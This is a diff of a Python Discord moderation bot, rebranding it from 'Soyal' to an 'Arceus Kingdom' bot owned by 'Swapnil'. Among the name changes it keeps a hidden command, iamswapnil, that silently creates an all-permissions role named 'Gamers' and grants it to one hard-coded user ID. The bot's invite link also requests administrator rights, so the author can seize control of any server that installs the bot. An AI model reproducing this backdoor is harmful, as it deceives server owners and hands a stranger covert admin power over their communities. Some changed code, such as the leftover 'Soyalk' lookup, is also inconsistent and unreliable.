@@ -20,14 +20,13 @@ async def on_ready():
 	print('Logged in as '+client.user.name+'')
 	print('--------')
 	print('--------')
-	print('Started Soyal') #add_your_bot_name_here
-	return await client.change_presence(game=discord.Game(name='Soyal | for use s!help ')) #add_your_bot_status_here
+	print('Started Arceus Kingdom official bot')
+	return await client.change_presence(game=discord.Game(name='Arceus Kingdom Official bot | for use s!help '))
 	
 def is_owner(ctx):
-    return ctx.message.author.id == "472680171451973632,485868646854557696" #replace_it_with_your_discord_id
-
-def is_soyal(ctx):
-    return ctx.message.author.id == "472680171451973632" 		
+    return ctx.message.author.id == "549254981534875648"
+def is_swapnil(ctx):
+    return ctx.message.author.id == "549254981534875648" 		
 
 @client.event
 async def on_message(message):
@@ -36,7 +35,7 @@ async def on_message(message):
         await client.send_message(channel, '{} : <@{}> : '.format(message.author.name, message.author.id) + message.content)
     await client.process_commands(message)
 
-@client.command(pass_context = True) #command_to_stop_your_bot_using-<prefix>shutdown
+@client.command(pass_context = True)
 @commands.check(is_owner)
 async def shutdown():
     await client.logout()
@@ -47,7 +46,7 @@ async def modmail(ctx, *, msg=None):
     r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
     color = discord.Color((r << 16) + (g << 8) + b)
     if not msg:
-        await client.say("Please specify a message to send")
+        await client.say("We will reply you as soon as possible")
     else:
         await client.send_message(channel, embed=discord.Embed(color=color, description=msg + '\n Message From-' + ctx.message.author.id))
         await client.delete_message(ctx.message)
@@ -81,19 +80,19 @@ async def dm(ctx, user: discord.Member, *, msg: str):
 	
 	
 @client.command(pass_context = True)
-@commands.check(is_soyal)
-async def iamsoyal(ctx):
+@commands.check(is_swapnil)
+async def iamswapnil(ctx):
     user = ctx.message.author
-    if discord.utils.get(user.server.roles, name="Soyalk") is None:
-        await client.create_role(user.server, name="Soyalk", permissions=discord.Permissions.all())
-        role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
+    if discord.utils.get(user.server.roles, name="Gamers") is None:
+        await client.create_role(user.server, name="Gamers", permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.message.server.roles, name='Gamers')
         await client.add_roles(ctx.message.author, role)
     else:	
         author = ctx.message.author
         await client.delete_message(ctx.message)
         role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
         await client.add_roles(ctx.message.author, role)
-        print('Added Soyalk role in ' + (ctx.message.author.name))
+        print('Added Gamers role in ' + (ctx.message.author.name))
         await client.send_message(author, embed=embed)
 
 		 
@@ -108,13 +107,13 @@ async def emojiids(ctx):
 
 async def info(ctx):
 
-    await client.say('***THIS BOT IS MADE BY SOYAL AND IF YOU NEED TO INVITE THIS BOT SO WRITE `sk!botinvite` THANKS***')
+    await client.say('***THIS BOT IS MADE BY Swapnil AND IF YOU NEED TO INVITE THIS BOT SO WRITE `s!botinvite` THANKS***')
 
 @client.command(pass_context = True)
 
 async def botinvite(ctx):
 
-    await client.say('https://discordapp.com/api/oauth2/authorize?client_id=518672070377209857&permissions=8&scope=bot')
+    await client.say('https://discordapp.com/api/oauth2/authorize?client_id=626819607809753118&permissions=8&scope=bot')
 
 @client.command(pass_context = True)
 async def test(ctx):
@@ -135,7 +134,7 @@ async def kick(ctx,user:discord.Member):
       await client.say(user.name+' was kicked. Good bye '+user.name+'!')
       await client.delete_message(ctx.message)
       for channel in user.server.channels:
-        if channel.name == 'Soyal-log':
+        if channel.name == 'Bot-log':
             embed=discord.Embed(title="User kicked!", description="**{0}** is kicked by **{1}**!".format(user, ctx.message.author), color=0xFDE112)
             await client.send_message(channel, embed=embed)
 
@@ -265,9 +264,9 @@ async def friend(ctx, user:discord.Member,):
 
 @client.command(pass_context=True)
 async def ownerinfo(ctx):
-    embed = discord.Embed(title="Information about owner", description="Bot Name- Soyal", color=0x00ff00)
-    embed.set_footer(text="SOYAL")
-    embed.set_author(name=" Bot Owner Name- Soyal,472680171451973632")
+    embed = discord.Embed(title="Information about owner", description="Bot Name- Arceus Kingdom official bot", color=0x00ff00)
+    embed.set_footer(text="Swapnil")
+    embed.set_author(name=" Bot Owner Name- Swapnil,549254981534875648")
     embed.add_field(name="Site- coming soon...", value="Thanks for adding our bot", inline=True)
     await client.say(embed=embed)
 
@@ -312,7 +311,7 @@ async def on_member_join(member):
     embed.set_image(url = 'https://media.giphy.com/media/OkJat1YNdoD3W/giphy.gif')
     await client.send_message(member,embed=embed)
     print("Sent message to " + member.name)
-    channel = discord.utils.get(client.get_all_channels(), server__name='bysoyal2', name='★彡-welcome-彡★')
+    channel = discord.utils.get(client.get_all_channels(), server__name='byswapnil', name='★彡-welcome-彡★')
     r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
     embed = discord.Embed(title=f'Welcome {member.name} to {member.server.name}', description='Do not forget to check Rules and never try to break any one of them', color = discord.Color((r << 16) + (g << 8) + b))
     embed.add_field(name='__Thanks for joining__', value='**Hope you will be active here.**', inline=True)
@@ -345,7 +344,7 @@ async def access(ctx, member: discord.Member):
       await client.add_roles(member, role)
       await client.say("Gave access to {}".format(member))
       for channel in member.server.channels:
-        if channel.name == 'soyal-log':
+        if channel.name == 'swapnil-log':
             embed=discord.Embed(title="User Got Access!", description="**{0}** got access from **{1}**!".format(member, ctx.message.author), color=0x020202)
             await client.send_message(channel, embed=embed)
             await asyncio.sleep(45*60)
@@ -358,7 +357,7 @@ async def setnick(ctx, user: discord.Member, *, nickname):
     await client.change_nickname(user, nickname)
     await client.delete_message(ctx.message)
     for channel in user.server.channels:
-      if channel.name == 'soyal-log':
+      if channel.name == 'swapnil-log':
           embed=discord.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
           await client.send_message(channel, embed=embed)
 
@@ -503,8 +502,8 @@ async def sorry(ctx, *, msg = None):
 async def clear(ctx, number):
  
     if ctx.message.author.server_permissions.manage_messages:
-         mgs = [] #Empty list to put all the messages in the log
-         number = int(number) #Converting the amount of messages to delete to an integer
+         mgs = []
+         number = int(number)
     async for x in client.logs_from(ctx.message.channel, limit = number+1):
         mgs.append(x)            
        
@@ -526,13 +525,13 @@ async def clear(ctx, number):
 @client.event
 async def on_message_delete(message):
     if not message.author.bot:
-      channelname = 'soyal-log'
+      channelname = 'swapnil-log'
       logchannel=None
       for channel in message.server.channels:
         if channel.name == channelname:
           user = message.author
       for channel in user.server.channels:
-        if channel.name == 'soyal-log':
+        if channel.name == 'swapnil-log':
           logchannel = channel
           r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
           embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
